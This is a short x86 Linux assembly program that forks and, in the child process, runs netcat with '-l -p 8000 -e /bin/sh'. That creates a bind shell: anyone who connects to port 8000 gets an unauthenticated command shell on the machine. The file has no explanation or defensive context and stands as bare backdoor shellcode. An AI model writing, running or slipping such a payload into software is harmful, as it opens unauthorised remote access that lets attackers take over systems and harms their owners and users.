section	.text
	global _start

	file	db	'/usr/bin/nc', 0

	argv	dd	arg0
		dd	arg1
		dd	arg2
		dd	arg3
		dd	arg4
		dd	arg5
		dd	0

	arg0	db	'nc', 0
	arg1	db	'-l', 0
	arg2	db	'-p', 0
	arg3	db	'8000', 0
	arg4	db	'-e', 0
	arg5	db	'/bin/sh', 0

	_start:
		mov	al, 2

		int	0x80

		cmp	al, 0
		jnz	exit

		mov	al, 11
		mov	ebx, file
		mov	ecx, argv
		xor	dl, dl

		int	0x80

	exit:
		xor	ax, ax
		inc	al
		xor	bl, bl

		int	0x80
